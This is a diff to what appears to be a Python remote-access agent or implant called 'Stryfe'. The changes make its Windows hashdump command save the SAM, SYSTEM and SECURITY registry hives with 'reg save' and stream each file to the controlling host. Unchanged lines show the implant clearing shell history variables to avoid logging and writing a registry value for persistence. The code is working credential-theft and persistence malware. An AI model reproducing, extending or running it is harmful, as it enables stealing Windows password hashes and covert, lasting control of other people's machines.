@@ -10,6 +10,7 @@ if platform.system() == "Windows":
 
 ERROR_INSUFFICIENT_PERMS = b'\x98\x90\x90\x30\x22\x11'
 SIG_EOF = b'\x4F\x4F\x4E\x4F\x01'
+FILE_NOT_FOUND = b'\x01\x23\x45\x67\x89'
 
 SHELL = ["/bin/bash", "--noprofile"]
 FIRST_COMMAND = "unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND"
@@ -170,7 +171,7 @@ class Client:
                         self.secure_sock.sendall(chunk)
                 self.secure_sock.sendall(SIG_EOF)
             except Exception as e:
-                self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
+                self.secure_sock.sendall(FILE_NOT_FOUND)
 
     def upload(self, args):
         try:
@@ -180,8 +181,8 @@ class Client:
                     decoded_data = data.decode("latin1")
                     if (data == SIG_EOF) or (not data):
                         break
-                    if (decoded_data.startswith("ERROR:")):
-                        os.remove(file)
+                    if (data == FILE_NOT_FOUND):
+                        os.remove(f)
                         return
                     f.write(data)
         except Exception as e:
@@ -255,27 +256,53 @@ class WindowsClient(Client):
         winreg.SetValueEx(key, "Stryfe", 0, winreg.REG_SZ, self.agent_path)
         winreg.CloseKey(key)
 
+    def send_file(self, path):
+        # if it exists
+        if os.access(path, os.F_OK):
+            # if user has permissions to read the file
+            if os.access(path, os.R_OK):
+                try:
+                    with open(path,'rb') as f:
+                        while (chunk := f.read(4096)):
+                            self.secure_sock.sendall(chunk)
+                    self.secure_sock.sendall(SIG_EOF)
+                except Exception as e:
+                    print("Error while sending file: ", e)
+                    self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
+            else:
+                # Sending error code if user doesnt have permissions to dump hashes
+                self.secure_sock.sendall(ERROR_INSUFFICIENT_PERMS)
+            self.secure_sock.sendall(SIG_EOF)
+        else:
+            self.secure_sock.sendall(FILE_NOT_FOUND)
+
+    def delete_file(self, filepath):
+        try:
+            os.remove(filepath)
+        except Exception as e:
+            pass
+
     def hashdump(self, args):
+        print("In hashdump windows client")
         base_path = os.path.join('C:', 'Windows', 'Temp')
         sam_path = os.path.join(base_path, 'sam')
         system_path = os.path.join(base_path, 'system')
+        security_path = os.path.join(base_path, 'security')
 
+        # Delete files if they exist to avoid entering in interactive mode
+        self.delete_file(sam_path)
         subprocess.run("reg save HKLM\\SAM %s" % sam_path, shell=True)
+        self.delete_file(system_path)
         subprocess.run("reg save HKLM\\SYSTEM %s" % system_path, shell=True)
-        """
-        if os.access(sam_path, os.R_OK):
-            try:
-                with open(sam_path,'rb') as f:
-                    while (chunk := f.read(4096)):
-                        self.secure_sock.sendall(chunk)
-                self.secure_sock.sendall(SIG_EOF)
-            except Exception as e:
-                self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
-        else:
-            # Sending error code if user doesnt have permissions to dump hashes
-            self.secure_sock.sendall(ERROR_INSUFFICIENT_PERMS)
-        self.secure_sock.sendall(SIG_EOF)
-        """
+        self.delete_file(security_path)
+        subprocess.run("reg save HKLM\\SECURITY %s" % security_path, shell=True)
+
+        print(f"Sending file {sam_path}")
+        self.send_file(sam_path)
+        print(f"Sending file {system_path}")
+        self.send_file(system_path)
+        print(f"Sending file {security_path}")
+        self.send_file(security_path)
 
     def ipconfig(self, args):
         output = subprocess.check_output("ipconfig /all", shell=True, text=True, encoding='utf-8', errors='ignore')
